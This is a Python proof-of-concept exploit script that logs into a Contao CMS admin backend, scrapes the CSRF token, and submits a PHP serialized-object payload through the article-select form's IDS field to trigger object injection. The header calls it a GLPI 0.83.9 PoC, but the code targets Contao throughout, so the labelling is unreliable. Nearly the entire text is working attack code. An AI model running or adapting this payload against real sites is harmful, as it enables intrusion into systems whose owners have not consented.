# GLPI (0.83.9) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup
import random

def printUsageAndExit():
    print("[#] Usage: python [BASEURL] [ADMINID] [ADMINPW]")
    exit()

def login(baseurl, adminid, adminpw):
    URL = "{}{}".format(baseurl, "/contao/")
    with requests.Session() as session:
        csrf_req = session.get(baseurl)
        soup = BeautifulSoup(csrf_req.text, features="html.parser")
        csrf_token = soup.find("input", {"name": "REQUEST_TOKEN"})['value']
        login_data = {
        		"FORM_SUBMIT":	"tl_login",
				"REQUEST_TOKEN": csrf_token,
				"username": adminid,
				"password": adminpw,
				"language": "",
				"login": "Login"
                }
        header = {
                "Referer": "{}{}".format(baseurl, "/contao/")
                }
        r = session.post(URL, data = login_data, headers = header)
        if(r.text.find("system/cron/cron.txt") > -1):
            print("[!] Login Failed!")
            exit()
        else:
            return session

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 4):
    printUsageAndExit()

BASEURL = sys.argv[1]
ADMINID = sys.argv[2]
ADMINPW = sys.argv[3]

# Get token
session = login(BASEURL, ADMINID, ADMINPW)
token_req = session.get("{}{}".format(BASEURL, "/contao/main.php?do=article"))
soup = BeautifulSoup(token_req.text, features="html.parser")
token = soup.find("input", {"name": "REQUEST_TOKEN"})['value']

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'

PAYLOAD = {
 "FORM_SUBMIT": "tl_select",
 "REQUEST_TOKEN": token,
 "IDS": TRIGGER_INPUT,
 "edit": "Edit"
}

header = {
        "Referer": "{}{}{}".format(BASEURL, "/contao/main.php?do=article&act=select&rt=", token)
        }

# Submit PAYLOAD
poc_req = session.post("{}{}{}".format(BASEURL, "/contao/main.php?do=article&act=select&rt=", token),
                        headers = header, data = PAYLOAD)

# print(poc_req.text)
